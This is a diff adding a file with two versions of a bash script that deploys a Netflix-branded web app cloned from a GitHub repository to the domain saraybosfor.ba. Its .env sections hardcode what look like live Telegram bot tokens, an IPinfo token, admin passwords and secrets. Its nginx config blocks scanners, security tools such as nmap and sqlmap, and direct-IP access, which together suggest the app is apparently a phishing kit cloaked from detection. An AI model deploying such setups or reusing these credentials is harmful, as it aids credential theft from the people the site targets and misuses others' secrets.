@@ -1,0 +1,455 @@
+📌 How to Use
+
+1️⃣ Copy & paste the script into a file:
+nano deploy.sh
+
+2️⃣ Make it executable:
+chmod +x deploy.sh
+
+3️⃣ Run the script:
+./deploy.sh
+-------------------------
+deploy.sh file content:
+#!/bin/bash
+
+set -e  # Exit immediately if a command exits with a non-zero status
+
+### CONFIGURATION
+DOMAIN="saraybosfor.ba"
+WWW_DOMAIN="www.$DOMAIN"
+GIT_REPO="https://github.com/Yosef21A/netflix2.git"
+VPS_IP="62.146.225.93"
+
+### ✅ Update & Install Dependencies
+echo "🔄 Updating packages and installing dependencies..."
+apt update && apt upgrade -y
+apt install -y nginx curl git ufw unzip tar socat
+
+### ✅ Install Node.js 20 (Clean Previous Versions)
+echo "📌 Removing existing Node.js and installing Node.js 20..."
+sudo apt remove --purge -y nodejs libnode-dev
+sudo apt autoremove -y
+sudo rm -rf /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock /var/cache/apt/archives/*
+sudo dpkg --configure -a
+
+# Install Node.js 20
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install -y nodejs
+
+### ✅ Install PM2 Globally
+echo "🔧 Installing PM2 globally..."
+npm install -g pm2
+pm2 update
+
+### ✅ Clone the Repository
+echo "📥 Cloning the repository..."
+rm -rf /var/www/netflix
+git clone $GIT_REPO /var/www/netflix
+
+### ✅ Create .env File for Client
+echo "📄 Creating .env file for client..."
+cat > /var/www/netflix/client/.env <<EOL
+SKIP_PREFLIGHT_CHECK=true
+REACT_APP_API_URL=https://$DOMAIN
+REACT_APP_WS_URL=wss://$DOMAIN
+REACT_APP_SECRET_KEY="secret-key-baby"
+REACT_APP_ADMIN_PASSWORD="KLKklk44"
+REACT_APP_API_TOKEN="7dqF4c8o3YhQJ9Lh95m562GHQfQsbZwh1DVJ1aSY47dzYIrU"
+EOL
+
+### ✅ Create .env File for Server
+echo "📄 Creating .env file for server..."
+cat > /var/www/netflix/server/.env <<EOL
+PORT=8000
+JWT_SECRET="secret-key-baby"
+CLIENT_URL=https://$DOMAIN,https://www.$DOMAIN
+TELEGRAM_CHAT_ID="-4710403141"
+TELEGRAM_BOT_TOKEN="7311847932:AAENMyj9RTYPUZI2sBy1F1Iyt0F4j3njkH8"
+IPINFO_TOKEN="1747848c31b8bd"
+ADMIN_SECRET="7dqF4c8o3YhQJ9Lh95m562GHQfQsbZwh1DVJ1aSY47dzYIrU"
+EOL
+
+### ✅ Update API URL in public/index.js
+echo "📝 Updating API URL in public/index.js..."
+sed -i "s|https://mydomain.com|https://$DOMAIN|g" /var/www/netflix/client/public/index.js
+
+### ✅ Set Up Backend
+echo "🚀 Setting up backend..."
+cd /var/www/netflix/server
+npm install
+pm2 start app.js --name "netflix-backend"
+pm2 save
+pm2 startup
+
+### ✅ Set Up Frontend
+echo "🎨 Setting up frontend..."
+cd /var/www/netflix/client
+npm install --legacy-peer-deps
+npm run build
+rm -rf /var/www/html
+mv build /var/www/html
+
+### ✅ Initial Nginx Configuration (HTTP Only)
+echo "🌍 Configuring Nginx..."
+cat > /etc/nginx/sites-available/netflix <<EOL
+server {
+    listen 80;
+    server_name $DOMAIN $WWW_DOMAIN;
+
+    location / {
+        root /var/www/html;
+        index index.html;
+        try_files \$uri /index.html;
+    }
+
+    location /api/ {
+        proxy_pass http://localhost:8000;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+    }
+
+    location /stream-event {
+        proxy_pass http://localhost:8000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection "Upgrade";
+    }
+}
+EOL
+
+ln -s /etc/nginx/sites-available/netflix /etc/nginx/sites-enabled/
+nginx -t && systemctl restart nginx
+
+### ✅ Open Firewall Ports
+echo "🔐 Configuring firewall..."
+ufw allow OpenSSH
+ufw allow 'Nginx Full'
+ufw --force enable
+
+### ✅ Install acme.sh & Register Account with Let's Encrypt
+echo "🔒 Installing acme.sh and registering account with Let's Encrypt..."
+curl https://get.acme.sh | sh
+/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
+
+# Register account with email
+/root/.acme.sh/acme.sh --register-account -m admin@$DOMAIN
+
+# Stop Nginx temporarily for standalone validation
+systemctl stop nginx
+
+### ✅ Obtain SSL Certificate
+echo "🔒 Requesting SSL certificate using acme.sh..."
+/root/.acme.sh/acme.sh --issue --standalone -d $DOMAIN -d $WWW_DOMAIN
+
+# Create SSL directory
+mkdir -p /etc/ssl/$DOMAIN
+
+# Install SSL certificate
+/root/.acme.sh/acme.sh --install-cert -d $DOMAIN \
+    --key-file /etc/ssl/$DOMAIN/saraybosfor.ba.key \
+    --fullchain-file /etc/ssl/$DOMAIN/saraybosfor.ba.crt
+
+# Restart Nginx
+systemctl start nginx
+
+### ✅ Update Nginx Configuration for SSL
+echo "🌍 Updating Nginx configuration for HTTPS..."
+cat > /etc/nginx/sites-available/netflix <<EOL
+server {
+    listen 80;
+    server_name $DOMAIN $WWW_DOMAIN;
+    return 301 https://\$host\$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name $DOMAIN $WWW_DOMAIN;
+
+    ssl_certificate /etc/ssl/$DOMAIN/saraybosfor.ba.crt;
+    ssl_certificate_key /etc/ssl/$DOMAIN/saraybosfor.ba.key;
+
+    add_header X-Frame-Options DENY;
+    add_header X-XSS-Protection "1; mode=block";
+    add_header X-Content-Type-Options nosniff;
+
+    location / {
+        root /var/www/html;
+        index index.html;
+        try_files \$uri /index.html;
+    }
+
+    location /api/ {
+        proxy_pass http://localhost:8000;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+    }
+
+    location /stream-event {
+        proxy_pass http://localhost:8000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection "Upgrade";
+    }
+
+    location ~* /\.(git|svn|htaccess|htpasswd|env|env.*|config.*|log.*|backup.*|save.*|sample.*|bak|old|db.*|sql.*|DS_Store)$ {
+        deny all;
+        access_log off;
+        log_not_found off;
+    }
+
+    if (\$http_user_agent ~* (python|curl|wget|bot|crawl|spider|scanner|scraper|nmap|masscan|zmap|dirbuster|fierce|sqlmap|acunetix|metasploit)) {
+        return 403;
+    }
+
+    if (\$host ~* "^(\d+\.\d+\.\d+\.\d+)$") {
+        return 444;
+    }
+
+    if (\$http_user_agent = "") {
+        return 403;
+    }
+}
+EOL
+
+nginx -t && systemctl restart nginx
+
+echo "✅ Deployment Complete! 🚀"
+echo "🌍 Visit: https://$DOMAIN"
+
+
+
+--------------------------------
+--------------------------------
+----------------------------------
+-------------------------------
+------------------------------
+------------------------------
+--------------------------------
+--------------------------------
+----------------------------------
+-------------------------------
+------------------------------
+------------------------------
+--------------------------------
+--------------------------------
+----------------------------------
+-------------------------------
+------------------------------
+------------------------------
+--------------------------------
+--------------------------------
+----------------------------------
+-------------------------------
+------------------------------
+------------------------------
+
+
+
+or this deploy.sh:
+#!/bin/bash
+
+set -e  # Exit immediately if a command exits with a non-zero status
+
+### CONFIGURATION
+DOMAIN="saraybosfor.ba"
+WWW_DOMAIN="www.$DOMAIN"
+GIT_REPO="https://github.com/Yosef21A/netflix2.git"
+VPS_IP="62.146.225.93"
+
+### ✅ Update & Install Dependencies
+echo "🔄 Updating packages and installing dependencies..."
+apt update && apt upgrade -y
+apt install -y nginx curl git ufw unzip tar socat software-properties-common certbot python3-certbot-nginx
+
+### ✅ Install Node.js 20 (Clean Previous Versions)
+echo "📌 Removing existing Node.js and installing Node.js 20..."
+sudo apt remove --purge -y nodejs libnode-dev
+sudo apt autoremove -y
+sudo rm -rf /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock /var/cache/apt/archives/*
+sudo dpkg --configure -a
+
+# Install Node.js 20
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install -y nodejs
+
+### ✅ Install PM2 Globally
+echo "🔧 Installing PM2 globally..."
+npm install -g pm2
+pm2 update
+
+### ✅ Clone the Repository
+echo "📥 Cloning the repository..."
+rm -rf /var/www/netflix
+git clone $GIT_REPO /var/www/netflix
+
+### ✅ Create .env File for Client
+echo "📄 Creating .env file for client..."
+cat > /var/www/netflix/client/.env <<EOL
+SKIP_PREFLIGHT_CHECK=true
+REACT_APP_API_URL=https://$DOMAIN/api
+REACT_APP_WS_URL=wss://$DOMAIN
+REACT_APP_SECRET_KEY="secret-key-baby"
+REACT_APP_ADMIN_PASSWORD="DNDNDNDNazz"
+REACT_APP_API_TOKEN="7dqF4c8o3YhQJ9Lh95m562GHQfQsbZwh1DVJ1aSY47dzYIrU"
+REACT_APP_WEATHER_SECRET="weather"
+REACT_APP_NEWS_SECRET="news"
+REACT_APP_ATH_SECRET="ath"
+REACT_APP_TG_SEC="TgSECCCC"
+REACT_APP_ADMIN_SECRET="7dqF4c8o3YhQJ9Lh95m562GHQfQsbZwh1DVJ1aSY47dzYIrU"
+REACT_APP_WS_PATH_TOKEN="KKAlkfe645fed5g154gea651q321vd56s4fa6z1g32"
+EOL
+
+### ✅ Create .env File for Server
+echo "📄 Creating .env file for server..."
+cat > /var/www/netflix/server/.env <<EOL
+PORT=8000
+JWT_SECRET="secret-key-baby"
+CLIENT_URL=https://$DOMAIN,https://www.$DOMAIN
+TELEGRAM_CHAT_ID="-4743040937"
+TELEGRAM_BOT_TOKEN="7930466331:AAH947h7aNdQBtrbrnZU_VkbhXHPofzH95U"
+IPINFO_TOKEN="1747848c31b8bd"
+ADMIN_SECRET="7dqF4c8o3YhQJ9Lh95m562GHQfQsbZwh1DVJ1aSY47dzYIrU"
+WEATHER_SECRET="weather"
+NEWS_SECRET="news"
+ATH_SECRET="ath"
+TG_SEC="TgSECCCC"
+WS_PATH_TOKEN="KKAlkfe645fed5g154gea651q321vd56s4fa6z1g32"
+EOL
+
+### ✅ Update API URL in public/index.js
+echo "📝 Updating API URL in public/index.js..."
+sed -i "s|http://localhost:8000|https://$DOMAIN|g" /var/www/netflix/client/public/index.js
+
+### ✅ Set Up Backend
+echo "🚀 Setting up backend..."
+cd /var/www/netflix/server
+npm install
+pm2 start app.js --name "netflix-backend"
+pm2 save
+pm2 startup
+
+### ✅ Set Up Frontend
+echo "🎨 Setting up frontend..."
+cd /var/www/netflix/client
+npm install --legacy-peer-deps
+npm run build
+rm -rf /var/www/html
+mv build /var/www/html
+
+### ✅ Initial Nginx Configuration (HTTP Only)
+echo "🌍 Configuring Nginx..."
+cat > /etc/nginx/sites-available/netflix <<EOL
+server {
+    listen 80;
+    server_name $DOMAIN $WWW_DOMAIN;
+
+    location / {
+        root /var/www/html;
+        index index.html;
+        try_files \$uri /index.html;
+    }
+
+    location /api/ {
+        proxy_pass http://localhost:8000;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+    }
+
+    location ~ ^/ws_[a-zA-Z0-9]{16}$ {
+    proxy_pass http://localhost:8080;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "Upgrade";
+    proxy_set_header Host $host;
+    }
+}
+EOL
+
+ln -s /etc/nginx/sites-available/netflix /etc/nginx/sites-enabled/
+nginx -t && systemctl restart nginx
+
+### ✅ Open Firewall Ports
+echo "🔐 Configuring firewall..."
+ufw allow OpenSSH
+ufw allow 'Nginx Full'
+ufw --force enable
+
+### ✅ Obtain SSL Certificate from Certbot
+echo "🔒 Requesting SSL certificate using Certbot..."
+certbot --nginx -d $DOMAIN -d $WWW_DOMAIN --non-interactive --agree-tos -m admin@$DOMAIN --redirect
+
+### ✅ Enable Automatic SSL Renewal
+echo "🔄 Enabling automatic SSL renewal..."
+echo "0 3 * * * root certbot renew --quiet" | tee -a /etc/crontab > /dev/null
+
+### ✅ Update Nginx Configuration for SSL
+echo "🌍 Updating Nginx configuration for HTTPS..."
+cat > /etc/nginx/sites-available/netflix <<EOL
+server {
+    listen 80;
+    server_name $DOMAIN $WWW_DOMAIN;
+    return 301 https://\$host\$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name $DOMAIN $WWW_DOMAIN;
+
+    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
+
+    add_header X-Frame-Options DENY;
+    add_header X-XSS-Protection "1; mode=block";
+    add_header X-Content-Type-Options nosniff;
+
+    location / {
+        root /var/www/html;
+        index index.html;
+        try_files \$uri /index.html;
+    }
+
+    location /api/ {
+        proxy_pass http://localhost:8000;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+    }
+
+    location ~ ^/ws_[a-zA-Z0-9]{16}$ {
+        proxy_pass http://localhost:8080;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "Upgrade";
+        proxy_set_header Host $host;
+    }
+    location ~* /\.(git|svn|htaccess|htpasswd|env|env.*|config.*|log.*|backup.*|save.*|sample.*|bak|old|db.*|sql.*|DS_Store)$ {
+        deny all;
+        access_log off;
+        log_not_found off;
+    }
+
+    if (\$http_user_agent ~* (python|curl|wget|bot|crawl|spider|scanner|scraper|nmap|masscan|zmap|dirbuster|fierce|sqlmap|acunetix|metasploit)) {
+        return 403;
+    }
+
+    if (\$host ~* "^(\d+\.\d+\.\d+\.\d+)$") {
+        return 444;
+    }
+
+    if (\$http_user_agent = "") {
+        return 403;
+    }
+}
+EOL
+
+nginx -t && systemctl restart nginx
+
+echo "✅ Deployment Complete! 🚀"
+echo "🌍 Visit: https://$DOMAIN"
